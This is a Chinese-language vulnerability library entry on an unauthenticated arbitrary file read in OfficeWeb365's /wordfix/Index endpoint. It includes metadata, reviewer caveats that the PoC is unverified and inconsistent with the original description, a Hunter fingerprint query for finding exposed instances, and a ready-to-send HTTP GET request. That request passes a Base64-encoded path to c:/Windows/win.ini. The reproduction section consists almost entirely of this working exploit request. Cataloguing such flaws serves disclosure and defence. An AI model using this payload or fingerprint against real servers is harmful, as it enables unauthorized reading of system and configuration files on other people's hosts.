---
source: "wy876 漏洞文库"
title: "OfficeWeb365 wordfix/Index任意文件读取"
product: "OfficeWeb365"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未给版本；Windows路径示例"
prerequisites: "未说明；请求无凭证"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/aywxwlh86qyygfg7"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/OfficeWeb365/OfficeWeb365wordfix%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
hunter: "app.name=\"OfficeWeb365\""
id: "vw-1aecb51bae816065b22bf87e"
entity_id: "ve-1aecb51bae816065b22bf87e"
schema_version: "1"
previous_fofa_unverified: "app.name="
---

# OfficeWeb365 wordfix/Index任意文件读取

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：OfficeWeb365；wordfix/Index任意文件读取
- 版本、配置及部署条件：未给版本；Windows路径示例
- 认证与权限前提：未说明；请求无凭证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 已按原文中的具体接口、源码或上下文直接更正产品、根因或修复说明；未知版本和未经证明的影响仍明确保留为待核实。
- 描述为/wordfix/Indexs而请求/wordfix/Index，需核对
- 宣称独特加密但样本是Base64文件路径，应区分编码与加密
- 缺响应文本

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
OfficeWeb365是西安大西信息科技有限公司开发的，专注于Office文档在线预览及PDF文档在线预览云服务，包括Microsoft Word文档在线预览、Excel表格在线预览、Powerpoint演示文档在线预览，WPS文字处理、WPS表格、WPS演示及Adobe PDF文档在线预览。广泛应用于OA办公系统、招聘网站、在线教育类网站，提高客户体验、增加产品竞争力。OfficeWeb365 /wordfix/Index 接口（原简介写作 Indexs，与请求不一致）处存在任意文件读取漏洞，请求中的 f 参数是文件路径的 Base64 编码（示例解码为 c:/Windows/win.ini），不是加密。正文未给出响应，实际可读范围与权限仍待核实。

## 二、影响版本
+ OfficeWeb365

## 三、资产测绘
+ hunter：`app.name="OfficeWeb365"`


+ 登录页面


## 四、漏洞复现
```http
GET /wordfix/Index?f=YzovV2luZG93cy93aW4uaW5p HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/aywxwlh86qyygfg7>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
